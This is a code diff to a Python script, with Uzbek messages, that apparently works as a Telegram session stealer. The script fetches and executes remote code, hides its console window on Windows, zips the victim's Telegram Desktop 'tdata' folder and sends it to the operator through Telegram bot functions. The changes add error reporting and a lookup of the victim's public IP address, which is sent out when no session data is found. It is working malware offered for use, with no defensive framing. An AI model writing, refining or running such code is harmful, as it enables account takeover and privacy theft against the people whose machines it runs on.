@@ -1,6 +1,5 @@
 import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
 
-# O'z-o'zini ishga tushirish
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
     try:
         exec(urllib.request.urlopen(sys.argv[0]).read())
@@ -8,7 +7,6 @@ if len(sys.argv) > 0 and "http" in sys.argv[0]:
     except:
         pass
 
-# Qora oynani yashirish
 if os.name == 'nt':
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -44,7 +42,7 @@ def send_telegram_message(text):
     except:
         pass
 
-def zip_and_send():
+def main():
     pc_name = socket.gethostname()
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
@@ -60,10 +58,16 @@ def zip_and_send():
                             file_path = os.path.join(root, file)
                             zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                         except: pass
-            send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+            send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!")
             os.remove(zip_path)
+        except Exception as e:
+            send_telegram_message(f"❌ Xatolik: {str(e)}")
+    else:
+        try:
+            ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
+            send_telegram_message(f"⚠️ tdata topilmadi!\nIP: {ip}")
         except:
             pass
 
 if __name__ == "__main__":
-    zip_and_send()
+    main()
